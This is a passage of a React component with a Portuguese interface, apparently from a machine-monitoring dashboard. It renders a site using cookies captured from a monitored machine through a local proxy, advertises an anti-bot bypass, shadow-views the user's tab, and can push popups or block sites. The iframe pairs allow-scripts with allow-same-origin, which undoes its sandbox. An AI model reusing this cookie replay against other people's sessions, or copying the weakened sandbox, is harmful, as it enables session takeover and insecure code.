      toast.success(`Site ${incident.host} bloqueado apenas para ${machineId}`);
    } catch (err: any) {
      console.error('Error blocking site for machine:', err);
      toast.error(err.message || 'Erro ao bloquear site');
    }
  };

  // Convert incident data to session format for PopupTemplateModal
  const sessionData = {
    tab_id: resolvedSession?.tab_id || (incident as any).tab_id || 'unknown',
    machine_id: resolvedSession?.machine_id || (incident as any).machine_id || 'unknown',
    domain: incident.host,
    url: currentUrl || incident.tab_url || '',
    title: null
  };

  return (
    <>
      <div className="w-full h-full flex flex-col gap-4">
        {/* Live Site Viewer Card */}
        <Card className="flex-1 flex flex-col min-h-[500px]">
          <CardHeader className="pb-4 flex-shrink-0">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Globe className="h-5 w-5 text-primary" />
                <CardTitle className="text-lg">Visualizar Site com Cookies</CardTitle>
              </div>
              <Button variant="outline" size="sm" onClick={onClose}>
                Fechar
              </Button>
            </div>
            
            <div className="flex items-center gap-2 text-sm text-muted-foreground flex-wrap">
              <span className="font-medium">Host:</span>
              <span>{incident.host}</span>
              {cookies.length > 0 && (
                <Badge variant="secondary" className="ml-2">
                  {cookies.length} cookies • Anti-bot bypass
                </Badge>
              )}
              <Badge variant="outline" className="ml-2 text-primary border-primary">
                Proxy Local • Sem CSP Supabase
              </Badge>
            </div>

            {/* View Mode Toggle */}
            <div className="flex items-center gap-2 mt-3">
              <Button
                variant={viewMode === 'shadow' ? 'default' : 'outline'}
                size="sm"
                onClick={() => {
                  setViewMode('shadow');
                  setSrcDoc(null);
                }}
                className="gap-2"
              >
                👁️ Shadow View
              </Button>
              <Button
                variant={viewMode === 'independent' ? 'default' : 'outline'}
                size="sm"
                onClick={() => {
                  setViewMode('independent');
                  setIndependentUrl(incident.tab_url || `https://${incident.host}`);
                }}
                className="gap-2"
              >
                🔍 Independent
              </Button>
              
              {viewMode === 'shadow' && shadowSnapshot && (
                <Badge variant="outline" className="ml-2">
                  Watching: {new URL(shadowSnapshot.url).hostname}
                </Badge>
              )}
              
              {viewMode === 'shadow' && !shadowSnapshot && (
                <Badge variant="outline" className="ml-2 text-muted-foreground">
                  Aguardando atividade...
                </Badge>
              )}
            </div>

            <div className="flex items-center gap-2 mt-2">
              <Button
                onClick={() => loadSiteWithCookies()}
                disabled={!incident.tab_url}
                size="sm"
                className="gap-2"
              >
                <Globe className="h-4 w-4" />
                Carregar com Cookies
              </Button>
              
              {srcDoc && (
                <Button
                  onClick={refreshSite}
                  variant="outline"
                  size="sm"
                  className="gap-2"
                >
                  <RefreshCw className="h-4 w-4" />
                  Atualizar
                </Button>
              )}
              
              <Button
                onClick={handleOpenPopup}
                variant="default"
                size="sm"
                className="gap-2"
              >
                <MessageSquare className="h-4 w-4" />
                Enviar Popup
              </Button>

              <Button
                onClick={blockSiteForMachine}
                variant="destructive"
                size="sm"
                className="gap-2"
              >
                <Ban className="h-4 w-4" />
                Bloquear Site (Máquina)
              </Button>
            </div>
          </CardHeader>

          <CardContent className="flex-1 p-0 overflow-hidden relative">
            {error && (
              <Alert variant="destructive" className="m-4">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>{error}</AlertDescription>
              </Alert>
            )}

            {/* Status Indicators */}
            {iframeStatus === 'timeout' && (
              <div className="absolute top-4 right-4 z-10 bg-yellow-500/90 text-white px-3 py-1.5 rounded-md text-sm font-medium shadow-lg flex items-center gap-2">
                <span>⚠️</span>
                <span>Site carregado mas pode ter funcionalidade limitada</span>
              </div>
            )}
            {iframeStatus === 'loading' && srcDoc && (
              <div className="absolute top-4 right-4 z-10 bg-blue-500/90 text-white px-3 py-1.5 rounded-md text-sm font-medium shadow-lg flex items-center gap-2">
                <span className="animate-spin">⏳</span>
                <span>Carregando site...</span>
              </div>
            )}

            {srcDoc && (
              <iframe
                key={iframeKey}
                srcDoc={srcDoc}
                className="w-full h-full border-0"
                sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads allow-modals"
                title={`Site: ${incident.host}`}
                onLoad={() => console.log('[LocalProxy] Iframe loaded')}
                onError={(e) => console.error('[LocalProxy] Iframe error:', e)}
              />
            )}

            {!srcDoc && !error && (
              <div className="flex items-center justify-center h-64 text-center">
                <div>
                  <Globe className="h-12 w-12 mx-auto mb-4 text-muted-foreground" />
                  <p className="text-muted-foreground mb-2">
                    Clique em "Carregar com Cookies" para visualizar o site
                  </p>
                  <p className="text-sm text-muted-foreground">
                    Proxy local com controle total • Sem CSP do Supabase
                  </p>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Popup Responses Panel */}
        <div className="w-full">
          <PopupResponsesPanel />
        </div>
      </div>

      {/* Popup Template Modal */}
      <PopupTemplateModal
        isOpen={isPopupModalOpen}
        onClose={() => setIsPopupModalOpen(false)}
        session={sessionData}
      />
    </>
  );
};